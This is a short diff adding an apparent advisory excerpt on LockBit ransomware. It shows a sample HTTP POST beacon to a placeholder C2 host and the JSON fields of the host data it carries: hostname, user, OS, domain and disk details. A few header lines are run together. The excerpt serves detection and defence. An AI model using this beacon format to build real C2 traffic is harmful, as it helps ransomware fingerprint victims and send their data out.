@@ -1,0 +1,21 @@
+Example of HTTP POST request
+POST <Lockbit C2>/?7F6Da=u5a0TdP0&Aojq=&NtN1W=OuoaovMvrVJSmPNaA5&fckp9=FCYyT6b7kdyeEXywS8I8 HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate, br Content-Type: text/plain
+User-Agent: Safari/537.36 <Lockbit User Agent String>
+Host: <Lockbit C2>
+Connection: Keep-Alive LIWy=RJ51lB5GM&a4OuN=<Lockbit
+ID>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI& 6SF3g=JPDt9lfJIQ&wQadZP=<Base64 encrypted data> Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl
+Example of information found in encrypted data
+{
+"bot_version":"X",
+"bot_id":"X",
+"bot_company":"X", "host_hostname":"X", "host_user":"X",
+"host_os":"X",
+"host_domain":"X",
+"host_arch":"X",
+"host_lang":"X", "disks_info":[
+{
+"disk_name":"X",
+"disk_size":"XXXX", "free_size":"XXXXX"
+}
